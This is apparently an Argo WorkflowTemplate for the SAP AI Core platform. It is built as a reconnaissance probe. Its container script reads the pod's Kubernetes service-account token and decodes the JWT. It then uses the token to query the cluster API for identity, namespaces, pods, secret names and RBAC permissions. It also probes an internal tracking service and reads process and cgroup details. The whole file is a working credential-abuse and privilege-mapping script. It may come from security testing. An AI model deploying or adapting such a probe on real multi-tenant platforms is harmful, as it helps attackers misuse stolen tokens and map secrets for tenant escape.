apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: argo-expr-probe
  labels:
    scenarios.ai.sap.com/id: "argo-expr-probe-scenario"
    ai.sap.com/version: "1.0.1"
  annotations:
    scenarios.ai.sap.com/name: "argo-expr-probe-scenario"
    executables.ai.sap.com/name: "argo-expr-probe"
    executables.ai.sap.com/description: "sa token k8s api probe"
spec:
  entrypoint: probe
  templates:
  - name: probe
    container:
      image: python:3.11-alpine
      command: ["sh", "-c"]
      args:
      - |
        apk add -q curl 2>/dev/null
        echo "=== KEY ENV VARS ==="
        echo "AICORE_TRACKING=$AICORE_TRACKING_ENDPOINT"
        echo "KUBERNETES_SERVICE_HOST=$KUBERNETES_SERVICE_HOST"
        echo "KUBERNETES_SERVICE_PORT=$KUBERNETES_SERVICE_PORT"
        echo "AI_MAIN_TENANT=$AI_MAIN_TENANT"
        echo ""
        echo "=== SA TOKEN ==="
        TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
        NS_PATH="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        if [ -f "$TOKEN_PATH" ]; then
          SA_TOK=$(cat "$TOKEN_PATH")
          NS=$(cat "$NS_PATH" 2>/dev/null || echo "unknown")
          echo "token_len=${#SA_TOK}"
          echo "namespace=$NS"
          # Decode JWT payload
          PAYLOAD=$(echo "$SA_TOK" | cut -d. -f2 | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip()
pad=d+'=='*((4-len(d)%4)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)),indent=2))
" 2>/dev/null)
          echo "jwt_payload=$PAYLOAD"
          echo ""
          echo "=== K8S API ==="
          K8S="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT_HTTPS:-443}"
          echo "api=$K8S"
          # whoami
          echo "--- selfsubjectreview ---"
          curl -sk "$K8S/apis/authentication.k8s.io/v1/selfsubjectreviews" \
            -XPOST -H "Authorization: Bearer $SA_TOK" -H "Content-Type: application/json" \
            -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>/dev/null
          echo ""
          # list namespaces
          echo "--- namespaces (first 30) ---"
          curl -sk "$K8S/api/v1/namespaces?limit=30" \
            -H "Authorization: Bearer $SA_TOK" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'items' in d:
    print([n['metadata']['name'] for n in d['items']])
else:
    print(d.get('message',d)[:300])
" 2>/dev/null
          echo ""
          # pods in our NS
          echo "--- pods in $NS (first 10) ---"
          curl -sk "$K8S/api/v1/namespaces/$NS/pods?limit=10" \
            -H "Authorization: Bearer $SA_TOK" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'items' in d:
    print([p['metadata']['name'] for p in d['items']])
else:
    print(d.get('message',d)[:200])
" 2>/dev/null
          echo ""
          # secrets in our NS
          echo "--- secrets in $NS ---"
          curl -sk "$K8S/api/v1/namespaces/$NS/secrets?limit=5" \
            -H "Authorization: Bearer $SA_TOK" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'items' in d:
    for s in d['items']:
        print('  secret:', s['metadata']['name'], 'type:', s.get('type'))
else:
    print(d.get('message',d)[:200])
" 2>/dev/null
          echo ""
          # RBAC rules for our NS
          echo "--- rbac selfsubjectrulesreview ---"
          curl -sk "$K8S/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -XPOST -H "Authorization: Bearer $SA_TOK" -H "Content-Type: application/json" \
            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
s=d.get('status',{})
print('resourceRules:')
for r in s.get('resourceRules',[]):
    if r.get('verbs') and r.get('verbs')!=['']:
        print(' ', r['verbs'], r.get('resources'), r.get('apiGroups'))
print('nonResourceRules:')
for r in s.get('nonResourceRules',[]):
    print(' ', r.get('verbs'), r.get('nonResourceURLs'))
" 2>/dev/null
        else
          echo "no SA token"
          ls -la /var/run/secrets/ 2>&1
        fi
        echo ""
        echo "=== TRACKING ENDPOINT ==="
        TRACK="${AICORE_TRACKING_ENDPOINT:-http://ml-tracking-service.ml-tracking.svc.cluster.local}"
        curl -sk "$TRACK/" -m5 -o /dev/null -w "status=%{http_code} time=%{time_total}" || echo "failed"
        echo ""
        curl -sk "$TRACK/v2/executions" -m5 -H "AI-Resource-Group: default" | head -c 500 || echo "no_result"
        echo ""
        echo "=== PROC INFO ==="
        cat /proc/1/cmdline | tr '\0' ' ' ; echo
        cat /proc/self/cgroup | head -3
        echo "=== DONE ==="
